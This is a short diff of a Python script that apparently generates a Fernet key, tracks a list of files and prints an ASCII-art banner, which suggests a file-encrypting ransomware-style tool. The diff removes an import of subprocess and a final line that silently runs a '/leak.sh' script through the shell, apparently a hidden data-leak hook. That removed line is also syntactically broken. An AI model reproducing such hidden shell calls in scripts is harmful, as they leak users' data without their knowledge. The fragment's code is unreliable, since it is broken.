@@ -4,9 +4,6 @@ from art import *
 from time import sleep
 from termcolor import colored
 
-import subprocess
-
-
 files = []
 
 key = Fernet.generate_key()
@@ -4385,4 +4382,3 @@ tprint("M0nStERwith23FacEs", "rnd-xlarge")
 print("")
 print("")
 print("")
-print(subprocess.run([/leak.sh], shell=True)
